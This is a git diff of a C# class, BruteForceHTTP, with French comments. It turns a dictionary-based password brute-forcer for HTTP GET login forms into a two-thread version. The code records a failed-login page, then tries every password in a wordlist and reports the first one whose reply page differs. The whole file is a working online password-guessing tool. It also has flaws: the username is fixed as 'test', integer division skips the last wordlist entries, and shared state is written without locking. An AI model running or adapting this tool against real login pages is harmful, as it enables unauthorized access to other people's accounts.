@@ -3,8 +3,7 @@ using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Net;
-using System.Text;
-using System.Threading.Tasks;
+using System.Threading;
 
 namespace bruteForce
 {
@@ -17,6 +16,13 @@ namespace bruteForce
         public string dicoPath = "";
         public string username = "";
         public string password = "";
+        public string passwordRight = "";
+        private string badRequest = "";
+        private string finalRequest = "";
+        private string[] allPassword;
+        private FileStream fl;
+        private int nbLine;
+        private const int NB_THREAD = 2;
 
         public BruteForceHTTP(string _url, string _get,  string _get2,string _dicoPath)
         {
@@ -24,52 +30,134 @@ namespace bruteForce
             this.getUsrename = _get;
             this.getPassword = _get2;
             this.dicoPath = _dicoPath;
+            //ouvertur du dictionnaire
+            fl = File.OpenRead(dicoPath);
+            //stocker dans une string les mots de passes
+            allPassword = File.ReadAllLines(dicoPath);
+            //nombre de mot de passe
+            nbLine = allPassword.Count();
 
         }
 
         public string findPassword()
         {
-            FileStream fl = File.OpenRead(dicoPath);
-            HttpWebResponse reponse;
-            String[] allPassword = File.ReadAllLines(dicoPath);
-            int nbLine = allPassword.Count();
-            string _url;
-            WebRequest request;
-            String badRequest = "";
-            String finalRequest = "";
-            StreamReader sr;
+            //construire l'url avec des guid car c'est unique donc aucun user aura ce mdp et nom
+            String _url = constructUrl(url, getUsrename, Guid.NewGuid().ToString(), getPassword, Guid.NewGuid().ToString());
+            //lancer la requete
+            WebRequest request = WebRequest.Create(_url);
+            HttpWebResponse reponse = (HttpWebResponse)request.GetResponse();
+            //stocker la page avec connexion échouée
+            StreamReader sr = new StreamReader(reponse.GetResponseStream());
+            badRequest = sr.ReadToEnd();
 
-            for (int i = -1; i < nbLine; i++)
+            //lANCEMENT DES REQUETES EN MULTITHREAD
+            List<Thread> threadList = new List<Thread>();
+            Thread dividePasswordFinder1 = new Thread(thread1Start);
+            threadList.Add(dividePasswordFinder1);
+            Thread dividePasswordFinder2 = new Thread(thread2Start);
+            threadList.Add(dividePasswordFinder2);
+
+            //lancer les threads
+            foreach (Thread th in threadList)
             {
-                if (i == -1)
-                {
-                    Guid guid = Guid.NewGuid();
-                    _url = constructUrl(url, getUsrename,  guid.ToString(), getPassword, guid.ToString());
-                    request = WebRequest.Create(_url);
-                    reponse = (HttpWebResponse)request.GetResponse();
-                    sr = new StreamReader(reponse.GetResponseStream());
-                    badRequest = sr.ReadToEnd();
-                }
-                else
-                {
+                th.Start();
+            }
+
+            //attendre la fin des threads
+            foreach (Thread th in threadList)
+            {
+                th.Join();
+            }
+
+            //retourner le mot de passe trouvé
+            return passwordRight;
+
+        }
+
+        /// <summary>
+        /// Lancer le 1er thread
+        /// </summary>
+        private void thread1Start()
+        {
+            string find = "";
+            find = findPasswordThread(0);
+
+            //si le mdp est vide ce n'est pas le bon
+            if (find != "")
+            {
+                //stocker le mot de passe si il est trouvé
+                passwordRight = find;
+            }
+        }
+
+        /// <summary>
+        /// Lancer le 2eme thread
+        /// </summary>
+        private void thread2Start()
+        {
+            string find = "";
+            find = findPasswordThread(1);
+
+            //si le mdp est vide ce n'est pas le bon
+            if (find != "")
+            {
+                //stocker le mot de passe si il est trouvé
+                passwordRight = find;
+            }
+        }
+
+
+        /// <summary>
+        /// Trouve le mot de passe
+        /// </summary>
+        /// <param name="iStart">numero du thread</param>
+        /// <returns>le mot de passe ou rien</returns>
+        public string findPasswordThread(int iStart)
+        {
+            //variable mot de passe
+            String passwordThread = "";
+            //variable de requete
+            HttpWebResponse reponse;
+            WebRequest request;
+            //string de l'url pour la requete
+            string _url;
+            //reponse de la requete
+            StreamReader sr;
+            
+            //diviser le dictionaire et tester si le mot de passe est corrrect
+            for (int i = nbLine/NB_THREAD*iStart; i < nbLine/NB_THREAD+ nbLine / NB_THREAD * iStart; i++)
+            {
+                    //construction de l'url avec le mot de passe dedans
                     _url = constructUrl(url, getUsrename, "test", getPassword, allPassword[i]);
+                    //lancer la requete
                     request = WebRequest.Create(_url);
                     reponse = (HttpWebResponse)request.GetResponse();
+                    //stocker le résultat
                     sr = new StreamReader(reponse.GetResponseStream());
                     finalRequest = sr.ReadToEnd();
-                }
-
-                if (finalRequest != badRequest && i != -1)
+                
+                //comparer la page si elle est similaire à celle d'erreur
+                if (finalRequest != badRequest)
                 {
+                    //retourner le mot de passe trouvé
                     return allPassword[i];
                 }
             }
-
-            return password;
+            //retourner si le mot de passse n'est pas trouvé
+            return passwordThread;
 
         }
 
 
+        /// <summary>
+        /// Construire l'url pour la requete
+        /// </summary>
+        /// <param name="_url"></param>
+        /// <param name="_get"></param>
+        /// <param name="_getText"></param>
+        /// <param name="_get2"></param>
+        /// <param name="_get2Text"></param>
+        /// <returns></returns>
         private string constructUrl(string _url, string _get, string _getText, string _get2, string _get2Text)
         {
             string toReturn;
